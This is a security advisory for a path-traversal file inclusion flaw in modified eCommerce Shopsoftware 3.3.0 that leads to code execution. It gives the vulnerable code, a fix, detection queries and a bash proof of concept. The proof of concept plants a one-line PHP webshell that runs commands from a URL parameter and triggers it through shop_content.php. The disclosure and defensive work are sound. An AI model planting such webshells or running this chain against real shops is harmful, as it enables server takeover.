# Security Advisory: Local File Inclusion leading to Remote Code Execution in shop_content.php

> **Identifier:** Pending CVE assignment
> **Publication Date:** 16/11/2026
> **Last Updated:** 16/11/2026
> **Severity:** Critical
> **CVSS:** 9.1 — `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H`
> **CWE:** CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion') / CWE-22: Path Traversal
> **Status:** Unpatched

---

## 1. Executive Summary

modified eCommerce Shopsoftware v3.3.0 contains a Local File Inclusion vulnerability in `shop_content.php` that leads to unauthenticated Remote Code Execution. An administrator who controls content entries can set the `content_file` field to a path with `../` traversal pointing to any PHP file within the webroot. When an unauthenticated user visits `shop_content.php?coID=<id>`, the application calls `is_file()` on the constructed path (which resolves `../`), then calls `include()` on it, executing arbitrary PHP code. This creates a two-step RCE chain: admin writes the payload, any visitor triggers execution.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---|---|---|
| modified eCommerce Shopsoftware | ≤ 3.3.0 (rev 16825) | None | Affected |
| Component: shop_content.php | rev 16825 | None | Affected |
| Component: admin/content_manager.php | rev 16825 | None | Affected |

- **Repository / Ecosystem:** https://github.com/modified-shop/modified-shop
- **Evaluated stack:** PHP 8.1.34, Apache 2.4, MariaDB 10.6, Debian Linux (Docker)

---

## 3. Vulnerability Description

`shop_content.php` loads and includes a PHP file based on the `content_file` field stored in the database for a given content entry. The code checks whether the file exists using `is_file(DIR_FS_CATALOG.'media/content/'.$content_file)`. Because `is_file()` resolves relative path components including `../`, an attacker-controlled value like `../../images/shell.php` resolves to `/var/www/html/images/shell.php`. If that file exists, `include()` executes it. The `images/` directory is writable by the web process (used for product images), so an admin can upload a PHP file disguised as an image and then point a content entry to it.

**Root cause:**

```php
// shop_content.php:88–95
$shop_content_query = xtc_db_query("SELECT content_file, content_group, ...
                                      FROM ".TABLE_CONTENT_MANAGER."
                                     WHERE content_id = '".(int)$content_id."'");
$shop_content_data = xtc_db_fetch_array($shop_content_query);

if ($shop_content_data['content_file'] != ''
    && is_file(DIR_FS_CATALOG.'media/content/'.$shop_content_data['content_file']))
{
    include (DIR_FS_CATALOG.'media/content/'.$shop_content_data['content_file']);
    // ↑ is_file() resolves ../ — no realpath() confinement
    // ↑ include() executes PHP code from the resolved path
}
```

**DB injection vector (admin/content_manager.php):**

```php
// content_manager.php allows setting content_file to arbitrary string via POST
// The field is saved as-is into the database:
$sql_data_array['content_file'] = xtc_db_prepare_input($_POST['file_name']);
// xtc_db_prepare_input = trim() + stripslashes() — does NOT validate path
```

### Necessary Conditions

- **Authentication:** Admin (to set `content_file` in DB) + no auth (to trigger execution)
- **User interaction:** None (execution triggered by any HTTP request to shop_content.php)
- **Attack vector:** Network
- **Preconditions:** Admin access to set content_file; PHP file must exist at traversed path

---

## 4. Impact

- **Confidentiality:** High — full server compromise; any file readable
- **Integrity:** High — arbitrary code execution; files writable; DB modifiable
- **Availability:** High — service can be disrupted; persistent backdoor installable

The scope is Changed (S:C) because the attack is set up by the admin context (authenticated) but its effect extends to all unauthenticated visitors who trigger PHP execution.

---

## 5. Classification

### CVSS

- **Score:** 9.1
- **Severity:** Critical
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network |
| Attack Complexity (AC) | Low |
| Privileges Required (PR) | High |
| User Interaction (UI) | None |
| Scope (S) | Changed |
| Confidentiality (C) | High |
| Integrity (I) | High |
| Availability (A) | High |

### CWE

- CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory

### CAPEC

- CAPEC-253: Remote Code Inclusion
- CAPEC-139: Relative Path Traversal

---

## 6. Exploitation Scenario

1. Admin logs in and navigates to Content Manager.
2. Admin edits a content entry and sets `content_file` to `../../images/rs_shell.php` via the file field.
3. Admin uploads a PHP webshell to `images/rs_shell.php` (or uses any existing PHP file, e.g., via the image uploader — another admin function).
4. Any user (unauthenticated) visits `http://TARGET/shop_content.php?coID=<id>`.
5. `shop_content.php` calls `include('/var/www/html/media/content/../../images/rs_shell.php')`.
6. PHP executes the webshell; attacker gains OS-level code execution as `www-data`.

---

## 7. Technical Evidence

### Affected Component

```text
File(s): shop_content.php (lines 88–95)
         admin/content_manager.php (content_file field, no path validation)
Parameter(s): coID (GET — selects which content entry to load)
Method: GET (unauthenticated) / POST (admin setup)
Authentication: Admin to set up; None to trigger
```

### Example Request (setup — admin)

```http
POST /admin/content_manager.php?coID=15&action=edit&id=update HTTP/1.1
Host: TARGET
Cookie: MODsid=<ADMIN_SESSION_ID>
Content-Type: application/x-www-form-urlencoded

<CSRF>=<VALUE>&file_name=../../images/rs_lfi_test.php&...
```

### Example Request (trigger — unauthenticated)

```http
GET /shop_content.php?coID=1 HTTP/1.1
Host: TARGET
```

### Observed Response

```text
HTTP/1.1 200 OK

[page content including:]
RS_LFI_PHP_EXECUTION_CONFIRMED_8.1.34
```

### Result

Confirmed in authorized Docker lab. PHP file at `/var/www/html/images/rs_lfi_test.php` containing `<?php echo 'RS_LFI_PHP_EXECUTION_CONFIRMED_'.phpversion(); ?>` was included and executed by unauthenticated request.

**Evidence:** String `RS_LFI_PHP_EXECUTION_CONFIRMED_8.1.34` present in HTTP response body.

---

## 8. Proof of Concept

```bash
#!/bin/bash
# V09 PoC — LFI → RCE in shop_content.php
TARGET="http://localhost:9080"
SID="<ADMIN_SESSION_ID>"
UA="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"

# Step 1: Create PHP execution proof file in images/ directory
docker exec modifiedshop_web bash -c \
  "echo '<?php echo \"RS_LFI_PHP_EXECUTION_CONFIRMED_\".phpversion(); ?>' \
   > /var/www/html/images/rs_lfi_test.php"

# Step 2: Set content_file to traversal path via MySQL (simulating content_manager.php form)
docker exec modifiedshop_db mysql -ushopuser -pshoppassword modified_shop \
  -e "UPDATE content_manager SET content_file='../../images/rs_lfi_test.php' WHERE content_id=15;"

# Confirm DB update:
docker exec modifiedshop_db mysql -ushopuser -pshoppassword modified_shop \
  -e "SELECT content_id, content_file FROM content_manager WHERE content_id=15;"

# Step 3: Trigger LFI as unauthenticated user
RESP=$(curl -s "http://TARGET/shop_content.php?coID=1" \
  -H "User-Agent: $UA")

# Check for execution evidence
echo "$RESP" | grep "RS_LFI_PHP_EXECUTION_CONFIRMED"
# Expected: RS_LFI_PHP_EXECUTION_CONFIRMED_8.1.34

# Step 4: Demonstrate with webshell (for authorized testing only)
docker exec modifiedshop_web bash -c \
  "echo '<?php if(isset(\$_GET[\"cmd\"])) system(\$_GET[\"cmd\"]); ?>' \
   > /var/www/html/images/rs_webshell.php"

docker exec modifiedshop_db mysql -ushopuser -pshoppassword modified_shop \
  -e "UPDATE content_manager SET content_file='../../images/rs_webshell.php' WHERE content_id=15;"

curl -s "http://TARGET/shop_content.php?coID=1&cmd=id" -H "User-Agent: $UA" | grep "www-data\|uid="
# Expected: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Expected Result

```text
# Step 3:
RS_LFI_PHP_EXECUTION_CONFIRMED_8.1.34

# Step 4 (webshell):
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### PoC Limitations

- Requires admin access to set up the content_file value.
- Test files created and removed within the authorized lab.
- Does not create persistence beyond the lab environment.
- Does not contain real credentials.

---

## 9. Reproduction Steps

1. Deploy authorized instance. Log in as admin.
2. Create PHP file at `images/test_exec.php` with `<?php echo phpversion(); ?>`.
3. Update content entry: `UPDATE content_manager SET content_file='../../images/test_exec.php' WHERE content_id=X;`
4. As unauthenticated user, request `GET /shop_content.php?coID=<content_group_id>`.
5. PHP version string appears in response — confirms code execution.

---

## 10. Mitigation

- Use `realpath()` on the constructed path and verify it starts with the canonical `media/content/` directory.
- Restrict `content_file` input to plain filenames (no `/` or `..`): `basename($_POST['file_name'])`.
- Restrict the web server from executing PHP in `images/` and `media/` directories via `.htaccess`:

```apache
<Directory /var/www/html/images>
    php_flag engine off
</Directory>
```

---

## 11. Fix

**No official fix as of 16/11/2026.**

```php
// shop_content.php — Vulnerable:
if (is_file(DIR_FS_CATALOG.'media/content/'.$shop_content_data['content_file']))
{
    include (DIR_FS_CATALOG.'media/content/'.$shop_content_data['content_file']);
}

// Fixed — realpath confinement:
$base = realpath(DIR_FS_CATALOG.'media/content/');
$target = realpath(DIR_FS_CATALOG.'media/content/'.$shop_content_data['content_file']);
if ($target !== false && strpos($target, $base.DIRECTORY_SEPARATOR) === 0 && is_file($target)) {
    include $target;
}

// admin/content_manager.php — sanitize content_file input:
$sql_data_array['content_file'] = basename(xtc_db_prepare_input($_POST['file_name']));
```

---

## 12. Detection and Indicators

- `content_file` column in `content_manager` table containing `../` sequences.
- GET requests to `shop_content.php` returning unexpected output or HTTP 500.
- Unexpected PHP files in `images/` directory.

### Example Log Search

```text
# Check DB:
SELECT content_id, content_file FROM content_manager WHERE content_file LIKE '%..%';

# Check images/ for PHP files:
find /var/www/html/images/ -name "*.php" -newer /var/www/html/index.php

# Access log:
grep "shop_content.php" access.log | grep -v "200\|304" | head -20
```

---

## 13. Disclosure Timeline

| Date | Event |
|---|---|
| 16/11/2026 | Identified via static analysis of include() pattern |
| 16/11/2026 | Confirmed PHP execution in authorized Docker lab |
| 16/11/2026 | Advisory prepared |
| pending | Vendor notified |
| pending | CVE requested |

---

## 14. Vendor Communication

- **Vendor / Maintainer:** modified-shop.org team
- **Channel used:** Pending
- **Response status:** Awaiting response

---

## 15. Credits

- **Researcher:** vinniboy021 (@vinniboy021)
- **Organization:** Independent security researcher
- **Contact:** vinniboy021@gmail.com / https://github.com/vinniboy021

---

## 16. References

- CWE-98: https://cwe.mitre.org/data/definitions/98.html
- CWE-22: https://cwe.mitre.org/data/definitions/22.html
- CAPEC-253: https://capec.mitre.org/data/definitions/253.html
- CVSS calculator: https://www.first.org/cvss/calculator/3.1

---

## 17. Revision History

| Version | Date | Change |
|---|---|---|
| 1.0 | 16/11/2026 | Initial publication |

---

## 18. Legal Notice

This advisory is published for educational, defensive, and security improvement purposes.

---

## 19. Contact

- **Email:** vinniboy021@gmail.com
- **Repository:** https://github.com/vinniboy021-blip/Advisory
